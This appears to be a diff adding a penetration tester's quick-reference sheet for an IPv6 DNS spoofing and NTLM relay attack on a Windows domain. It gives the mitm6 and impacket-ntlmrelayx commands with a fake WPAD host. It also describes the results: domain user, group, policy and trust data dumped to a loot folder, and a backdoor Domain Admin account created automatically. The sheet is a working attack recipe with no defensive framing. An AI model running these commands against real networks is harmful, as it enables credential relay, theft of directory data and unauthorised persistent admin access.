@@ -1,0 +1,21 @@
+MITM6 - QUICK REF
+
+[Tab 1 - keep open]
+    mitm6 -d <domain>
+
+[Tab 2 - keep open]
+    impacket-ntlmrelayx -6 -t ldap://<dc-ip> -wh fakewpad.<domain> -l <lootdir>
+
+When a victim connects:
+    → NTLM auth relayed to LDAP on DC
+    → Domain info dumped into <lootdir>/
+    → If relayed user = Domain Admin: backdoor DA account auto-created (noisy!)
+
+Loot folder contents:
+    domain_users.html/json/grep
+    domain_groups.html/json/grep
+    domain_computers.html/json/grep
+    domain_policy.html/json/grep          # password policies
+    domain_trusts.html/json/grep
+    domain_users_by_group.html
+    domain_computers_by_os.html
